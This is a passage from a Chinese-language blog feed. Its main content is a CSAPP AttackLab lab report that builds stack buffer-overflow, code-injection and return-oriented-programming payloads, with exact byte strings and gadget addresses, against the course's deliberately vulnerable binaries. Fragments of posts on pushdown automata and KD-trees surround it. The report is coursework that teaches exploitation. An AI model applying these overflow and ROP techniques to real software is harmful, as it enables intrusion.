(\left\{q, p\right\}, \left\{0, 1\right\}, \left\{Z_0, X\right\}, \delta, q, Z_0),</script><br>​    其中</p><script type="math/tex; mode=display">\begin{aligned}\delta(q, 0, Z_0) &= \left\{(q, XZ_0)\right\}, \\\delta(q, 0, X) &= \left\{(q, XX)\right\}, \\\delta(q, 1, X) &= \left\{(q, X)\right\}, \\\delta(q, \varepsilon, X) &= \left\{(p, \varepsilon)\right\}, \\\delta(p, 1, X) &= \left\{(p, XX)\right\}, \\\delta(p, 1, Z_0) &= \left\{(p, \varepsilon)\right\}, \\\delta(p, \varepsilon, Z_0) &= \left\{(p, \varepsilon)\right\}, \\\delta(p, \varepsilon, X) &= \left\{(p, \varepsilon)\right\}.\end{aligned}</script><h3 id="Ex-6-2-6-b"><a href="#Ex-6-2-6-b" class="headerlink" title="Ex 6.2.6 (b)"></a>Ex 6.2.6 (b)</h3><p>​    转换为以终态方式接受的 $PDA$<br>​    <script type="math/tex">P_2 = (\left\{p_0, p_f, q, p\right\}, \left\{0, 1\right\}, \left\{Z_0, X, X_0\right\}, \delta, q, Z_0, \left\{p_f\right\}),</script><br>​    其中</p><script type="math/tex; mode=display">\begin{aligned}\delta(p_0, \varepsilon, X_0) &= \left\{(q, Z_0X_0)\right\}, \\\delta(q, 0, Z_0) &= \left\{(q, XZ_0)\right\}, \\\delta(q, 0, X) &= \left\{(q, XX)\right\}, \\\delta(q, 1, X) &= \left\{(q, X)\right\}, \\\delta(q, \varepsilon, X) &= \left\{(p, \varepsilon)\right\}, \\\delta(q, \varepsilon, X_0) &= \left\{(p_f, \varepsilon)\right\}, \\\delta(p, 1, X) &= \left\{(p, XX)\right\}, \\\delta(p, 1, Z_0) &= \left\{(p, \varepsilon)\right\}, \\\delta(p, \varepsilon, X) &= \left\{(p, \varepsilon)\right\}, \\\delta(p, \varepsilon, X_0) &= \left\{(p_f, \varepsilon)\right\}.\end{aligned}</script>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 Lab 2</title>
      <link href="/2022/11/25/ji-suan-ji-xi-tong-gai-lun-lab-2/"/>
      <url>/2022/11/25/ji-suan-ji-xi-tong-gai-lun-lab-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Lab-2-AttackLab-实验报告"><a href="#Lab-2-AttackLab-实验报告" class="headerlink" title="Lab 2 AttackLab 实验报告"></a>Lab 2 AttackLab 实验报告</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul><li>学习 <code>GDB</code>与 <code>OBJDUMP</code> 的用法;</li><li>了解如何对没有保证缓冲区溢出安全的程序进行攻击;</li><li>熟悉 <code>x86-64</code> 构架下程序栈和参数传递的运行过程.</li></ul><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>导致程序漏洞的关键为 <code>getbuf</code> 函数:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">unsigned</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">Gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>getbuf</code> 函数在栈中申请了一块 <code>BUFFER_SIZE</code> 大小的空间, 并利用这块空间首地址作为 <code>Gets</code> 函数的参数从标准输入中读取字符. 我们可以通过提供一个超过 <code>BUFFER_SIZE</code> 的字符串来向 <code>getbuf</code> 的栈帧之外写入数据.</p><h2 id="Code-Injection-Attacks"><a href="#Code-Injection-Attacks" class="headerlink" title="Code Injection Attacks"></a>Code Injection Attacks</h2><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>需要重写函数的正常返回地址, 将函数重定向到 <code>touch1</code> 函数.</p><p>首先查看 <code>ctarget</code> 的反汇编代码.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> ctarget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>getbuf</code> 中, <code>%rsp</code> 被减了 <code>0x38</code>, <code>BUFFER_SIZE</code> 大小是 <code>56</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401cdb &lt;getbuf&gt;:  401cdb:f3 0f 1e fa          endbr64   401cdf:48 83 ec 38          sub    $0x38,%rsp  401ce3:48 89 e7             mov    %rsp,%rdi  401ce6:e8 b5 02 00 00       callq  401fa0 &lt;Gets&gt;  401ceb:b8 01 00 00 00       mov    $0x1,%eax  401cf0:48 83 c4 38          add    $0x38,%rsp  401cf4:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>touch1</code> 函数地址是 <code>0x401cf5</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401cf5 &lt;touch1&gt;:  401cf5:f3 0f 1e fa          endbr64   401cf9:50                   push   %rax  401cfa:58                   pop    %rax  401cfb:48 83 ec 08          sub    $0x8,%rsp  401cff:c7 05 f3 57 00 00 01 movl   $0x1,0x57f3(%rip)        # 4074fc &lt;vlevel&gt;  401d06:00 00 00   401d09:48 8d 3d f1 25 00 00 lea    0x25f1(%rip),%rdi        # 404301 &lt;_IO_stdin_used+0x301&gt;  401d10:e8 6b f3 ff ff       callq  401080 &lt;puts@plt&gt;  401d15:bf 01 00 00 00       mov    $0x1,%edi  401d1a:e8 f4 04 00 00       callq  402213 &lt;validate&gt;  401d1f:bf 00 00 00 00       mov    $0x0,%edi  401d24:e8 b7 f4 ff ff       callq  4011e0 &lt;exit@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解题思路:</p><ul><li>将 <code>getbuf</code> 函数栈上分配的空间填满, 并且在下 <code>8</code> 个字节, 即正常返回地址上填充 <code>touch1</code> 的地址.</li><li><code>getbuf</code> 函数执行 <code>ret</code> 指令后, 会从 <code>%rsp+56</code> 处获取返回地址, 而这块地址被改为 <code>touch1</code> 的地址, 程序返回 <code>touch1</code> 而非 <code>test</code>.</li></ul><p><img src="/pic/36.png" alt="栈帧结构"></p><p>现在构建输入字符串: 首先使用 <code>0x00</code> 填充栈上 <code>56</code> 个字节, 然后填充<code>touch1</code>地址, 注意字节序为小端序存储.</p><pre class="line-numbers language-none"><code class="language-none"># 1.txt00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00f5 1c 40 00 00 00 00 00  &lt;----- touch1 的起始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>需要在输入字符串中注入一段代码, 将 <code>cookie</code> 传递进 <code>%rdi</code> 作为参数, 然后程序流跳转到 <code>touch2</code> 函数.</p><p>我的 <code>cookie</code> 值为 <code>0x36bf93ac</code>, <code>touch2</code> 函数会验证传入的参数 <code>val</code> 是否和 <code>cookie</code> 相等.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span>    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>touch2</code> 函数地址是 <code>0x401d29</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401d29 &lt;touch2&gt;:  401d29:f3 0f 1e fa          endbr64   401d2d:50                   push   %rax  401d2e:58                   pop    %rax  ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解题思路:</p><ul><li>将返回地址设置为注入代码的地址, 选择在栈顶注入, 返回地址则设置为 <code>%rsp</code>.</li><li>将 <code>cookie</code> 值移入 <code>%rdi</code>, 随之被 <code>touch2</code> 作为参数调用.</li><li>接下来不能直接使用 <code>call</code>, <code>jmp</code> 指令调用 <code>touch2</code>, 只能先将 <code>touch2</code> 的地址压栈, 并使用 <code>ret</code> 改变当前 <code>%rip</code> 的指向地址.</li></ul><p>注入代码为:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 2.s movq   $0x36bf93ac, %rdipushq  $0x401d29retq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gcc <span class="token parameter variable">-c</span> <span class="token number">2</span>.slinux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> <span class="token number">2</span>.o <span class="token operator">&gt;</span> <span class="token number">2</span>.d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得到机器代码:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 2.d2.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:48 c7 c7 ac 93 bf 36 movq   $0x36bf93ac,%rdi   7:68 29 1d 40 00       pushq  $0x401d29   c:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们只需将指令序列 <code>48 c7 c7 ac 93 bf 36 68 29 1d 40 00 c3</code> 注入栈顶. 下面寻找 <code>getbuf</code> 运行栈的栈顶地址 <code>%rsp</code>, 使用 <code>gdb</code> 调试.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gdb ctarget<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token builtin class-name">break</span> getbuf<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span class="token operator">&gt;</span> run <span class="token parameter variable">-q</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span><span class="token operator">&gt;</span> disas<span class="token operator">=</span><span class="token operator">&gt;</span> 0x0000000000401cdb <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>:     endbr64    0x0000000000401cdf <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>:     sub    <span class="token variable">$0x38</span>,%rsp   0x0000000000401ce3 <span class="token operator">&lt;</span>+<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>:     mov    %rsp,%rdi   0x0000000000401ce6 <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:    callq  0x401fa0 <span class="token operator">&lt;</span>Gets<span class="token operator">&gt;</span>   0x0000000000401ceb <span class="token operator">&lt;</span>+1<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>:    mov    <span class="token variable">$0x1</span>,%eax   0x0000000000401cf0 <span class="token operator">&lt;</span>+2<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:    <span class="token function">add</span>    <span class="token variable">$0x38</span>,%rsp<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> stepi0x0000000000401cdf      <span class="token number">12</span>      <span class="token keyword">in</span> buf.c<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> stepi<span class="token number">14</span>      <span class="token keyword">in</span> buf.c<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> p /x <span class="token variable">$rsp</span><span class="token variable">$1</span> <span class="token operator">=</span> 0x55633168<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从而 <code>%rsp</code> 为 <code>0x55633168</code>.</p><p><img src="/pic/37.png" alt="栈帧结构"></p><p>下面构建输入字符串: 首先注入攻击代码, 然后使用 <code>0x00</code> 填充满栈上 <code>56</code> 个字节, 最后填充攻击代码的起始地址.</p><pre class="line-numbers language-none"><code class="language-none"># 2.txt48 c7 c7 ac 93 bf 36 6829 1d 40 00 c3 00 00 00  &lt;----- 注入代码00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00  68 31 63 55 00 00 00 00  &lt;----- 注入代码的起始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>需要在输入字符串中注入一段代码, 将 <code>cookie</code> 变为字符串并传入 <code>%rdi</code>, 然后程序流跳转到 <code>touch3</code> 函数.</p><p><code>hexmatch</code>函数检查 <code>cookie</code> 和传进来的字符是否匹配.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">hexmatch</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> cbuf <span class="token operator">+</span> <span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%.8x"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>sval<span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>touch3</code> 函数会调用 <code>hexmatch</code> 函数验证传入的参数 <code>val</code> 是否和 <code>cookie</code> 相等.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">touch3</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>sval<span class="token punctuation">)</span><span class="token punctuation">{</span>    vlevel <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hexmatch</span><span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch3!: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch3(\"%s\")\n"</span><span class="token punctuation">,</span> sval<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果将 <code>cookie</code> 串存放在 <code>getbuf</code> 栈帧中, 注意到 <code>hexmatch</code> 中 <code>char *s = cbuf + random() % 100</code> 可能会覆盖原 <code>getbuf</code> 栈帧, 造成数据丢失, 因此需将 <code>cookie</code> 串存放在 <code>test</code> 栈帧中.</p><p>解题思路:</p><ul><li>将 <code>cookie</code> 转为 <code>16</code> 进制字符串存放在 <code>test</code> 栈帧中.</li><li>将 <code>cookie</code> 串的地址移入 <code>%rdi</code>, 随之被 <code>touch3</code> 作为参数调用 (结合 <code>%rsp</code> 的地址与相对偏移量可确定).</li><li>接下来不能直接使用 <code>call</code>, <code>jmp</code> 指令调用 <code>touch3</code>, 只能先将 <code>touch3</code> 的地址压栈, 并使用 <code>ret</code> 改变当前 <code>%rip</code> 的指向地址.</li></ul><p><code>getbuf</code> 运行栈的栈顶地址 <code>%rsp</code> 为 <code>0x55633168</code>, 字符串 <code>cookie</code> 的 <code>ascii</code> 表示为 <code>33 36 62 66 39 33 61 63 00</code>, 距 <code>%rsp</code> 的偏移量为 <code>0x40</code>, 因此其地址为 <code>0x556331a8</code>. 注入代码为:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 3.s mov    $0x556331a8, %rdipushq  $0x401e4eretq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">linux<span class="token operator">&gt;</span> gcc <span class="token parameter variable">-c</span> <span class="token number">3</span>.slinux<span class="token operator">&gt;</span> objdump <span class="token parameter variable">-d</span> <span class="token number">3</span>.o <span class="token operator">&gt;</span> <span class="token number">3</span>.d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得到机器代码:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 3.d3.o:     file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:48 c7 c7 a8 31 63 55 mov    $0x556331a8,%rdi   7:68 4e 1e 40 00       pushq  $0x401e4e   c:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们只需将指令序列 <code>48 c7 c7 a8 31 63 55 68 4e 1e 40 00 c3</code> 注入栈顶.</p><p><img src="/pic/38.png" alt="栈帧结构"></p><p>下面构建输入字符串: 首先注入攻击代码, 然后使用 <code>0x00</code> 填充满栈上 <code>56</code> 个字节, 最后填充攻击代码的起始地址, 并保存 <code>cookie</code> 字符串.</p><pre class="line-numbers language-none"><code class="language-none"># 3.txt48 c7 c7 a8 31 63 55 68  &lt;----- 注入代码4e 1e 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0068 31 63 55 00 00 00 00  &lt;----- 注入代码的起始地址33 36 62 66 39 33 61 6300                      &lt;----- cookie 字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Return-Oriented-Programming-Attacks"><a href="#Return-Oriented-Programming-Attacks" class="headerlink" title="Return-Oriented Programming Attacks"></a>Return-Oriented Programming Attacks</h2><h3 id="Level-2-1"><a href="#Level-2-1" class="headerlink" title="Level 2"></a>Level 2</h3><p>需要做的是重复 <code>Code Injection Attacks</code> 中第二阶段的任务, 把 <code>cookie</code> 值传送到 <code>%rdi</code>, 然后调用 <code>touch2</code>. 但是无法再将指令序列放入到栈中, 而是需要在程序的 <code>gadget farm</code> 中找到需要的指令序列.</p><p>需要的代码为:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">popq %rax       # 将 cookie 存入 %raxmovq %rax, %rdi # 将 cookie 存入 %rdi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>popq %rax</code> 的指令字节为 <code>58</code>，找到了如下函数:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">0000000000401f1d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>setval_439</span><span class="token punctuation">&gt;</span></span>:  401f1d:f3 0f 1e fa          endbr64   401f21:c7 07 58 c3 4c cf    movl   $0xcf4cc358,(%rdi)  401f27:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得出 <code>popq %rax</code> 指令的地址为 <code>0x401f23</code>.</p><p><code>movq %rax, %rdi</code> 的指令字节为 <code>48 89 c7</code>, 找到了如下函数:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">0000000000401f12 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>setval_318</span><span class="token punctuation">&gt;</span></span>:  401f12:f3 0f 1e fa          endbr64   401f16:c7 07 6f 48 89 c7    movl   $0xc789486f,(%rdi)  401f1c:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得出 <code>movq %rax, %rdi</code> 指令的地址为 <code>0x401f19</code>.</p><p><img src="/pic/39.png" alt="栈帧结构"></p><p>下面构建输入字符串: 首先填充 <code>popq %rax</code> 指令, 注入 <code>cookie</code> 的值, 接着填入 <code>movq %rax, %rdi</code> 指令与 <code>touch2</code> 函数的起始地址.</p><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0023 1f 40 00 00 00 00 00  &lt;----- popq %raxac 93 bf 36 00 00 00 00  &lt;----- coookie19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi29 1d 40 00 00 00 00 00  &lt;----- touch2 的起始地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>需要做的是重复 <code>Code Injection Attacks</code> 中第三阶段的任务, 把 <code>cookie</code> 字符串的起始地址传送到 <code>%rdi</code>, 然后调用 <code>touch3</code>. 但是无法再将指令序列放入到栈中, 而是需要在程序的 <code>gadget farm</code> 中找到需要的指令序列.</p><p>因为程序使用栈随机化增强安全性能, 只能用栈顶地址 + 偏移量来索引 <code>cookie</code> 字符串的起始地址.</p><p>注意到 <code>farm</code> 中已经存在了一个 <code>add_xy</code> 函数, 可以考虑将 <code>%rsp</code> 传入 <code>%rdi</code>, 将偏移量传入 <code>%rsi</code>, 进而计算出 <code>cookie</code> 字符串的首地址, 并传送到 <code>%rax</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401f5b &lt;add_xy&gt;:  401f5b:f3 0f 1e fa          endbr64   401f5f:48 8d 04 37          lea    (%rdi,%rsi,1),%rax  401f63:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将 <code>%rsp</code> 传入 <code>%rdi</code> 需要的代码为:</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movq %rsp, %raxmovq %rax, %rdi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>将偏移量传入 <code>%rsi</code> 需要的代码为:</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">popq %raxmovq %eax, %ecxmovq %ecx, %edxmovq %edx, %esi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最困难的一条指令、也是唯一没有使用 <code>c3</code> 或 <code>90</code> 结尾的 <code>gadget</code> 指令为: 从 <code>%ecx</code> 传入 <code>%esi</code>. </p><p>这一步的指令字节为 <code>89 ca</code>, 而 <code>08 db</code> 为一个<code>nop</code> 指令 <code>orb %bl %bl</code> 的编码, 因此 <code>0x401fe9</code>是一个符合要求的 <code>gadget</code> 地址. </p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401fe3 &lt;setval_370&gt;:  401fe3:f3 0f 1e fa          endbr64   401fe7:c7 07 89 ca 08 db    movl   $0xdb08ca89,(%rdi)  401fed:c3                   retq   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>计算 <code>cookie</code> 地址, 传入 <code>%rdi</code> 需要的代码为:</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lea  (%rdi,%rsi,1),%raxmovq %rax, %rdi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>获取 <code>%rsp</code> 的指令与 <code>cookie</code> 字符串的存储地址间隔了九条 <code>8</code> 字节指令, 因此偏移量为 <code>0x48</code>.</p><p><img src="/pic/40.png" alt="栈帧结构"></p><p>下面构建输入字符串:</p><pre class="line-numbers language-none"><code class="language-none">00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00d3 1f 40 00 00 00 00 00  &lt;----- movq %rsp, %rax19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi23 1f 40 00 00 00 00 00  &lt;----- popq %rax48 00 00 00 00 00 00 00  &lt;----- cookie 字符串偏移量3f 20 40 00 00 00 00 00  &lt;----- movq %eax, %ecxe9 1f 40 00 00 00 00 00  &lt;----- movq %ecx, %edxa9 20 40 00 00 00 00 00  &lt;----- movq %edx, %esi5b 1f 40 00 00 00 00 00  &lt;----- lea  (%rdi,%rsi,1),%rax19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi4e 1e 40 00 00 00 00 00  &lt;----- touch3 的起始地址33 36 62 66 39 33 61 6300                       &lt;----- cookie 字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nearest Neighbour</title>
      <link href="/2022/11/23/nearest-neighbour/"/>
      <url>/2022/11/23/nearest-neighbour/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA3"><a href="#CST-PA3" class="headerlink" title="CST PA3"></a>CST PA3</h1><h2 id="3-6-Nearest-Neighbour"><a href="#3-6-Nearest-Neighbour" class="headerlink" title="3-6 Nearest Neighbour"></a>3-6 Nearest Neighbour</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>本题需使用 <code>KD-Tree</code> 数据结构.</p><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 16</span><span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> d<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">bool</span> <span class="token keyword">friend</span> <span class="token keyword">operator</span><span class="token operator">&lt;</span><span class="token punctuation">(</span>Node x<span class="token punctuation">,</span> Node y<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> x<span class="token punctuation">.</span>d<span class="token punctuation">[</span>comp<span class="token punctuation">]</span> <span class="token operator">&lt;</span> y<span class="token punctuation">.</span>d<span class="token punctuation">[</span>comp<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> node<span class="token 